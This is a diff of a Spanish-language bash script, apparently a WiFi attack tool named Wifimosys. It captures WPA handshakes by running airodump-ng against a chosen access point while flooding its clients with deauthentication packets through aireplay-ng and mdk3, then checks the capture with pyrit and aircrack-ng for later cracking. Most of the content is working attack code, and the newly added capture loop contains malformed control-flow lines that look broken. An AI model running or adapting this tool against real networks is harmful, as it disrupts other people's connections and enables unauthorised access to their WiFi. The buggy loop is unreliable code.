@@ -15,7 +15,7 @@ clear
 ##################################### Configuración general del script
 
 revision=1
-version=0.18
+version=0.19
 IP=192.168.1.1
 RUTATEMP="/tmp/Wifimosys"
 RUTAHANDSHAKE="/root/handshakes"
@@ -377,7 +377,7 @@ function msgscan {
 	echo -e "${yellow}          Obteniendo lista de redes...$transparent"
 	echo
 	echo -e "          Cierra la ventana ${yellow}ESCANEANDO$transparent cuando lo creas oportuno..."
-	echo -e "          $grey(aprox. 40-60 segundos para detectar todos los canales)"$transparent
+	echo -e "          $grey(aprox. 40-60 segundos para detectar todos los clientes)"$transparent
 	rm -rf $RUTATEMP/dump*
 }
 
@@ -387,7 +387,7 @@ function Scanchan {
 
 	limpialog
 	top
-	  echo -e $yellow"          Selecciona escaneo de canal(es):"$transparent
+	  echo -e $yellow"          Selecciona canal(es) a escanear:"$transparent
 	  echo
 	  echo -e "          Canal único "$blue"(ejemplo): "$green"6"$transparent""
 	  echo -e "          Rango de canales "$blue"(ejemplo): "$green"1-5"$transparent""
@@ -496,9 +496,9 @@ function caphandshake {
 	top
 	infoap
 	echo
-	echo -e "          Es necesario un handshake para poder continuar.$transparent"
+	echo -e "          ${white}Es necesario un handshake ${yellow}válido$transparent para continuar."
 	echo -e "          Usa un handshake de esta red ya obtenido (ejemplo:$red wifimosys.cap$transparent)"
-	echo -e "          o pulsa ${yellow}ENTER$transparent para capturar uno."
+	echo -e "          o ${yellow}pulsa ENTER$transparent para capturar uno."
 	echo
 	echo -ne "          Nombre del archivo .cap: $red"
 	read handscap
@@ -506,7 +506,7 @@ function caphandshake {
 	echo -ne "$transparent"
 
 		if [ "$handscap" = "" ]; then
-			deauth all;
+			Handshake_statuscheck="Capturando..."; deauthMENU; captura;
 		else
 			if [ -f "$handshakeloc" ]; then
 				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
@@ -532,118 +532,56 @@ function caphandshake {
 		fi
 }
 
-##################################### Menu de desautentificaciones
-
-function echaclientes {
-
-	limpialog
-	while true; do
-		top
-		infoap
-
-		echo "$header_deauthMENU"
-		echo
-		echo -e "          "$blue"1)"$transparent" Desautentificar todos los clientes"
-		echo -e "          "$blue"2)"$transparent" Desautentificar todos los clientes [mdk3]"
-		echo -e "          "$blue"3)"$transparent" Desautentificar un cliente en concreto "
-		echo -e "          "$blue"4)"$transparent" Reescanear redes "
-		echo -e "          "$blue"5)"$transparent" Salir"
-		echo
-		echo -n "          #> "
-		read desaut
-		echo
-		case $desaut in
-			1 ) deauth all; break ;;
-			2 ) deauth mdk3; break ;;
-			3 ) deauth esp; break ;;
-			4 ) killall airodump-ng &>$wifim_output_device; limpieza; break;;
-			5 ) exitmode; break ;;
-			* ) echo "          Elige una de la opciones que se muestran."; limpialog ;;
-		esac
-	done
-}
-
-function deauth {
-
-	iwconfig $WIFI_MONITOR channel $Host_CHAN
-	case $1 in
-		all )
-			DEAUTH=deauthall
-			capture & $DEAUTH
-			CSVDB=$Host_MAC-01.csv
-		;;
-		mdk3 )
-			DEAUTH=deauthmdk3
-			capture & $DEAUTH &
-			CSVDB=$Host_MAC-01.csv
-		;;
-		esp )
-			DEAUTH=deauthesp
-			HOST=`cat $RUTATEMP/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
-			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
-
-			if [ $LINEAS_CLIENTES -le 5 ]; then
-				DEAUTH=deauthall
-				capture & $DEAUTH
-				CSVDB=$Host_MAC-01.csv
-				deauth
-			fi
-
-			capture
-			for CLIENT in $HOST; do
-				Client_MAC=`echo ${CLIENT:0:17}`
-				deauthesp
-			done
-			$DEAUTH
-			CSVDB=$Host_MAC-01.csv
-		;;
-	esac
-	deauthMENU
-}
-
 function deauthMENU {
 
 	limpialog
 	top
 	infoap
 
-	echo -e "          Capturando, cierra la ventana ${yellow}HANDSHAKE$transparent cuando se obtenga."
-	echo -e "          $grey(lo sabrás cuando aparezca en la esquina superior derecha)$transparent"
-	echo -e 
-	echo -e $yellow"          Análisis del handshake: $Handshake_statuscheck"
+	echo -e $yellow"          Estado del handshake: $Handshake_statuscheck"
 	echo
-	echo -e "          "$blue"1)"$transparent" Comprobar validez del Handshake"
-	echo -e "          "$blue"2)"$transparent" Reintentar la captura"
-	echo -e "          "$blue"3)"$transparent" Probar con otro método de desautentificación"
-	echo -e "          "$blue"4)"$transparent" Seleccionar otra red"
-	echo -e "          "$blue"5)"$transparent" Salir"
+	echo -e "          "$blue"1)"$transparent" Reintentar la captura"
+	echo -e "          "$blue"2)"$transparent" Seleccionar otra red"
+	echo -e "          "$blue"3)"$transparent" Salir"
 	echo
 	echo -n '          #> '
-	read comphand
+}
+function elechand {
 
+	read comphand
 	case $comphand in
-		1 ) checkhandshake;;
-		2 ) Handshake_statuscheck="Capturando..."; deauth all; break ;;
-		3 ) limpialog; echaclientes; break;;
-		4 ) Handshake_statuscheck="Capturando..."; killall airodump-ng mdk3 aireplay-ng &>$wifim_output_device; CSVDB=dump-01.csv; selection; break ;;
-		5 ) exitmode; break;;
+		1 ) Handshake_statuscheck="Capturando..."; deauthMENU; captura; break;;
+		2 ) CSVDB=dump-01.csv; selection; break;;
+		3 ) exitmode; break;;
 		* ) echo "          Elige una de la opciones que se muestran.";;
 	esac
 }
 
 ##################################### Capturando Handshake
 
-function capture {
+function captura {
 
-	if ! ps -A | grep -q airodump-ng; then
 	rm -rf $RUTATEMP/$Host_MAC*
-	xterm $HOLD -title "HANDSHAKE" $VENTHAND -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $RUTATEMP/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR
+	xterm $HOLD -title "HANDSHAKE" $VENTHAND -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $RUTATEMP/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR &> /dev/null &
+	deauthall; sleep 5
+	NOW=$(date "+%s")
+	Handshake_statuscheck="${red}No se ha conseguido el handshake.$transparent"
+	while true; do
+	if [ $(($(date "+%s")-$NOW)) -ge 10 ];then
+	    killall airodump-ng &break &deauthMENU &elechand 
+	  elif echo $(aircrack-ng $RUTATEMP/$Host_MAC"-01.cap") | grep "(1 handshake)" &> /dev/null; then
+	    killall airodump-ng aireplay-ng &break &checkhandshake
 	fi
+	done
 }
 
 ##################################### Comprueba el handshake antes de continuar
 
 function checkhandshake {
+
+	Handshake_statuscheck="${green}Comprobando validez del handshake......$transparent"
+	deauthMENU
+	sleep 2
 
 	pyrit -r $RUTATEMP/$Host_MAC-01.cap -o $RUTATEMP/test.cap stripLive &>$wifim_output_device
 
@@ -655,11 +593,13 @@ function checkhandshake {
 		break
 	else
 		if aircrack-ng $RUTATEMP/$Host_MAC-01.cap | grep -q "1 handshake"; then
-			Handshake_statuscheck="${red}Handshake corrupto, prueba de nuevo$transparent"
+			Handshake_statuscheck="${red}Handshake corrupto, prueba de nuevo.$transparent"
 			deauthMENU
+			elechand
 		else
-			Handshake_statuscheck="${red}Archivo no válido o inexistente$transparent"
+			Handshake_statuscheck="${red}Archivo no válido o inexistente.$transparent"
 			deauthMENU
+			elechand
 		fi
 	fi
 	rm $RUTATEMP/test.cap &>$wifim_output_device
@@ -1095,11 +1035,6 @@ function deauthmdk3 {
 	echo "$Host_MAC" >$RUTATEMP/mdk3.txt
 	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando via mdk3 en $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $RUTATEMP/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
-}
-function deauthesp {
-
-	sleep 2
-	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando cliente en $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 ##################################### Cierra todos los procesos
